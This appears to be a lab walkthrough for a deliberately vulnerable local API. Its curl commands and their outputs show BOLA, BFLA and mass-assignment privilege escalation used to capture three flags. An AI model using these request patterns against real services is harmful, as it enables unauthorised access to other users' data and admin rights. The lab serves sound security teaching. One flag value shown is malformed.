# Walkthrough

## Step 1: start the lab

```bash
docker compose up --build -d
```

Wait for the container to build and start.

## Step 2: log in and get a token

```bash
TOKEN=$(curl -s http://127.0.0.1:5000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")
echo $TOKEN
```

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFsaWNlIn0.XXX
```

## Step 3: flag 1 via BOLA

Alice is user id 1. Request user id 2 with her token:

```bash
curl -s http://127.0.0.1:5000/api/users/2 \
  -H "Authorization: Bearer $TOKEN"
```

```json
{"id":2,"username":"bob","role":"user","email":"bob@corp.local","flag1":"POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}"}
```

The server never checks that alice owns user 2's record. `flag1` is in the response.

## Step 4: flag 2 via BFLA

Call the admin endpoint with alice's regular-user token:

```bash
curl -s http://127.0.0.1:5000/api/admin/users \
  -H "Authorization: Bearer $TOKEN"
```

```json
[
  {"id":1,"username":"alice","role":"user","email":"alice@corp.local","flag2":null},
  {"id":2,"username":"bob","role":"user","email":"bob@corp.local","flag2":null},
  {"id":3,"username":"admin","role":"admin","email":"admin@corp.local","flag2":"POC{b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5}"}
]
```

No role check on this endpoint. `flag2` is in the admin user's record.

## Step 5: flag 3 via mass assignment

Confirm that `/api/admin/secret` is blocked before escalation:

```bash
curl -s -o /dev/null -w '%{http_code}' \
  http://127.0.0.1:5000/api/admin/secret \
  -H "Authorization: Bearer $TOKEN"
```

```
403
```

Send `role: admin` in an update request to alice's own account:

```bash
curl -s -X PATCH http://127.0.0.1:5000/api/users/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"role":"admin"}'
```

```json
{"message":"updated"}
```

The endpoint accepts any field in the JSON body, including `role`. Alice's row in the database now has `role = admin`.

Access the secret endpoint:

```bash
curl -s http://127.0.0.1:5000/api/admin/secret \
  -H "Authorization: Bearer $TOKEN"
```

```json
{"flag3":"POC{c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6"}
```

## Full attack chain

```
POST /api/login  (alice:alice123)
    -> JWT token (user_id=1)

GET /api/users/2  (token; no ownership check)
    -> flag1 from bob's profile       [BOLA]

GET /api/admin/users  (token; no role check)
    -> flag2 from admin's profile     [BFLA]

PATCH /api/users/1  (token + {"role":"admin"})
    -> role written to DB             [mass assignment]

GET /api/admin/secret  (token; role=admin in DB now)
    -> flag3                          [escalation via mass assignment]
```
